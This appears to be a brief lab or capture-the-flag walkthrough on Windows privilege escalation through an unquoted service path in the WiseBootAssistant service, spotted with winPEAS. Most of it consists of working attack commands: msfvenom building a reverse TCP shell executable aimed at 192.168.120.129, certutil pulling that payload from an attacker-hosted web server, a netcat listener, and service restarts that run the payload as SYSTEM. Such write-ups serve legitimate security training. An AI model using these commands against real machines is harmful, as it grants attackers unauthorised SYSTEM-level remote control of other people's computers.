### winpeas

we see that WiseBootAssistant is running with Admin privs and without quoted paths and has a space detected. This is an `unquoted service path` which is a way to priv esc in Windows

This is the path we will be exploiting:
`c:\program files (x86)\wise\wise care 365\boottime.exe`

We can insert `wise.exe` where `wise care 365` is

---

### generate and run payload

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.120.129 LPORT=5555 -f exe > Wise.exe
```

host an http server with the payload, and use certutil to grab it

```
certutil.exe -urlcache -split -f http://192.168.120.129/Wise.exe Wise.exe
```

Start your netcat listener

```
nc -lvnp 5555
```


We will need to restart the service with the unquoted path

```
sc stop WiseBootAssistant
sc start WiseBootAssistant
```

Should now have system